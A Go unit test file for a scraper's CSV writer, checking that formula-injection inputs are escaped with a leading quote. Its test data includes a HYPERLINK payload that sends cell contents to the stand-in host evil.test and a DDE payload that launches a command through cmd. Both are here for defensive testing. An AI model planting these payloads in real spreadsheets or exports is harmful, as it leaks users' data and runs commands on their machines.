package output

import (
	"encoding/csv"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Anastylosis/FSS/models"
)

func TestEscapeCSVFormula(t *testing.T) {
	t.Parallel()
	tests := []struct {
		in, want string
	}{
		{"=1+1", "'=1+1"},
		{"+1", "'+1"},
		{"-1", "'-1"},
		{"@SUM(A1)", "'@SUM(A1)"},
		{"\tlead", "'\tlead"},
		{"\rlead", "'\rlead"},
		// The classic exfiltration payload.
		{`=HYPERLINK("http://evil.test?d="&A1,"click")`, `'=HYPERLINK("http://evil.test?d="&A1,"click")`},
		// Untouched: ordinary values must round-trip byte-for-byte.
		{"", ""},
		{"Normal Title", "Normal Title"},
		{"2026-01-01", "2026-01-01"},
		{"1920", "1920"},
		{"Jane Doe|John Smith", "Jane Doe|John Smith"},
		{"a=b", "a=b"},
	}
	for _, tt := range tests {
		if got := EscapeCSVFormula(tt.in); got != tt.want {
			t.Errorf("EscapeCSVFormula(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// A scraped title is attacker-controlled, so the written CSV must not contain a
// cell that a spreadsheet would evaluate.
func TestWriteCSVNeutralisesFormulaInScrapedFields(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	path := filepath.Join(dir, "out.csv")

	scenes := []models.Scene{{
		ID:          "1",
		SiteID:      "test",
		Title:       `=cmd|' /C calc'!A0`,
		Description: "@SUM(1+1)*cmd",
		Performers:  []string{"-2+3+cmd"},
		Date:        time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
	}}

	if err := WriteCSV(scenes, path); err != nil {
		t.Fatalf("WriteCSV: %v", err)
	}

	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	rows, err := csv.NewReader(strings.NewReader(string(raw))).ReadAll()
	if err != nil {
		t.Fatalf("parsing written CSV: %v", err)
	}
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want header + 1", len(rows))
	}

	for i, cell := range rows[1] {
		if cell == "" {
			continue
		}
		switch cell[0] {
		case '=', '+', '-', '@', '\t', '\r':
			t.Errorf("column %d (%q) starts with a formula trigger and would be evaluated",
				i, cell)
		}
	}

	// The payload must still be present, just defused — this is an escaping
	// change, not data loss.
	if !strings.Contains(string(raw), `cmd|' /C calc'!A0`) {
		t.Error("original title text was lost, not merely escaped")
	}
}
